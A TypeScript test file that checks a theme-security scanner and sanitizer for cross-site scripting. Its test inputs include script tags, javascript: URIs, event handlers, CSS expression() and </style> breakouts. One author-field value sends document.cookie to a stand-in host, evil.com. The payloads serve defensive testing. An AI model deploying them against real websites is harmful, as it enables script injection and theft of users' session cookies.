import { describe, expect, it } from 'vitest';
import { sanitizeValue, scanExtended, scanForXSS, scanThemeEntry } from '../src/lib/security';

describe('scanForXSS', () => {
  it('passes clean nested data', () => {
    const result = scanForXSS({
      date: '2026-07-26',
      preset: 'sakura',
      cssVars: { '--color-bg': '#fff', '--color-text': '#111' },
      directory: [{ preset: 'a', name: 'Alpha' }],
    });
    expect(result.isSafe).toBe(true);
    expect(result.flaggedReasons).toEqual([]);
  });

  it.each([
    ['<script> tag', '<script>alert(1)</script>'],
    ['javascript: protocol', 'javascript:alert(1)'],
    ['javascript : with spaces', 'javascript  :alert(1)'],
    ['event handler', '<img src=x onerror=alert(1)>'],
    ['document.cookie access', 'x=document.cookie'],
    ['eval call', 'eval(atob("payload"))'],
    ['iframe tag', '<iframe src="https://evil.com">'],
    ['CSS expression()', 'width: expression(alert(1))'],
    ['-moz-binding', '-moz-binding: url(x.xml#p)'],
    ['data:text/html URI', 'data:text/html,<script>alert(1)</script>'],
    ['</style> breakout', '</style><img src=x>'],
  ])('flags %s in any field', (_label, payload) => {
    const result = scanForXSS({ customCss: payload });
    expect(result.isSafe).toBe(false);
    expect(result.flaggedReasons.length).toBeGreaterThan(0);
  });

  it('ignores alert( in display-text fields (name, title, ...)', () => {
    const result = scanForXSS({ name: 'my alert(theme)', title: 'alert( in title' });
    expect(result.isSafe).toBe(true);
  });

  it('ignores alert( in array-indexed display fields like tags[0]', () => {
    const result = scanForXSS({ tags: ['alert(spring)'] });
    expect(result.isSafe).toBe(true);
  });

  it('flags alert( in executable-context fields', () => {
    const result = scanForXSS({ customCss: 'content: "alert(1)"' });
    expect(result.isSafe).toBe(false);
  });

  it('scans deeply nested arrays and objects', () => {
    const result = scanForXSS({ a: [{ b: { c: ['<script>x</script>'] } }] });
    expect(result.isSafe).toBe(false);
    expect(result.flaggedReasons[0]).toContain('root.a[0].b.c[0]');
  });

  it('strips < and > from the payload snippet to avoid alert-channel injection', () => {
    const result = scanForXSS({ customCss: '<script>alert(1)</script>' });
    // the quoted snippet must not carry live tags (pattern source may contain <>)
    expect(result.flaggedReasons[0]).toContain('"scriptalert(1)/script"');
  });
});

describe('scanExtended', () => {
  it('passes clean theme payload', () => {
    const result = scanExtended({
      preset: 'ocean',
      cssVars: { '--color-bg': '#001122' },
      customCss: '.hero { color: var(--color-bg); }',
      extensions: [{ type: 'widget', html: '<div class="ok">hi</div>' }],
    });
    expect(result.isSafe).toBe(true);
    expect(result.cssAudit.safe).toBe(true);
  });

  it('flags dangerous customCss via the CSS audit', () => {
    const result = scanExtended({ customCss: 'a { width: expression(alert(1)); }' });
    expect(result.isSafe).toBe(false);
    expect(result.cssAudit.safe).toBe(false);
    expect(result.cssAudit.issues.some((i) => i.includes('expression'))).toBe(true);
  });

  it('flags javascript: in cssVars values', () => {
    const result = scanExtended({ cssVars: { '--x': 'javascript:alert(1)' } });
    expect(result.isSafe).toBe(false);
    expect(result.cssAudit.issues.some((i) => i.includes('--x'))).toBe(true);
  });

  it('flags event handlers inside extension HTML', () => {
    const result = scanExtended({
      extensions: [{ type: 'widget', html: '<div onclick="steal()">x</div>' }],
    });
    expect(result.isSafe).toBe(false);
    expect(result.htmlAudit.modified).toBe(true);
  });

  it('flags invalid clickEffect className', () => {
    const result = scanExtended({
      clickEffect: { spawn: [{ className: 'bad name"><img', duration: 500 }] },
    });
    expect(result.isSafe).toBe(false);
    expect(result.flaggedReasons.some((r) => r.includes('className'))).toBe(true);
  });

  it('accepts valid clickEffect className', () => {
    const result = scanExtended({
      clickEffect: { spawn: [{ className: 'petal-fall', duration: 500 }] },
    });
    expect(result.isSafe).toBe(true);
  });
});

describe('scanThemeEntry (community/DIY themes)', () => {
  it('returns null for a clean theme', () => {
    const result = scanThemeEntry({
      id: 't1',
      name: 'Clean Theme',
      author: 'alice',
      status: 'approved',
      customCss: '.x { color: red; }',
      cssVars: { '--a': '#fff' },
      extensions: [{ type: 'footer', html: '<p>hi</p>' }],
    });
    expect(result).toBeNull();
  });

  it('flags expression() in customCss and records the bypassed sanitizer', () => {
    const result = scanThemeEntry({
      id: 't2',
      name: 'Evil',
      customCss: 'body { width: expression(alert(1)); }',
    });
    expect(result).not.toBeNull();
    expect(result!.flaggedReasons.some((r) => r.includes('customCss'))).toBe(true);
    expect(result!.bypassedSanitizers).toContain('CSS expression() stripping bypassed');
  });

  it('flags <script> in extension HTML and records the bypassed sanitizer', () => {
    const result = scanThemeEntry({
      id: 't3',
      name: 'Evil Ext',
      extensions: [{ type: 'widget', html: '<script>fetch("https://evil.com")</script>' }],
    });
    expect(result).not.toBeNull();
    expect(result!.flaggedReasons.some((r) => r.includes('extensions[0].html'))).toBe(true);
    expect(result!.bypassedSanitizers).toContain('HTML <script> tag stripping bypassed');
  });

  it('flags executable JS in the author field', () => {
    const result = scanThemeEntry({
      id: 't4',
      name: 'X',
      author: 'bob";fetch("https://evil.com/steal?c="+document.cookie)',
    });
    expect(result).not.toBeNull();
    expect(result!.bypassedSanitizers).toContain('author field JS injection not blocked');
  });

  it('flags </style> breakout in cssVars values', () => {
    const result = scanThemeEntry({
      id: 't5',
      name: 'Breakout',
      cssVars: { '--bg': '</style><script>alert(1)</script>' },
    });
    expect(result).not.toBeNull();
    expect(result!.flaggedReasons.some((r) => r.includes('cssVars["--bg"]'))).toBe(true);
  });

  it('records name HTML-stripping bypass alongside a real finding', () => {
    const result = scanThemeEntry({
      id: 't6',
      name: '<b>bold</b>',
      customCss: 'a { behavior: url(x.htc); } b { width: expression(1); }',
    });
    expect(result).not.toBeNull();
    expect(result!.bypassedSanitizers).toContain('name HTML tag stripping bypassed');
  });
});

describe('sanitizeValue', () => {
  it('removes script tags', () => {
    expect(sanitizeValue('a<script>alert(1)</script>b')).toBe('a[REMOVED]b');
  });

  it('neutralizes javascript: protocol', () => {
    expect(sanitizeValue('javascript:alert(1)')).toBe('blocked:blocked(1)');
  });

  it('neutralizes event handler assignments', () => {
    expect(sanitizeValue('<img onerror=alert(1)>')).toBe('<img blocked=blocked(1)>');
  });

  it('passes non-strings through untouched', () => {
    expect(sanitizeValue(42)).toBe(42);
    expect(sanitizeValue(null)).toBe(null);
  });
});
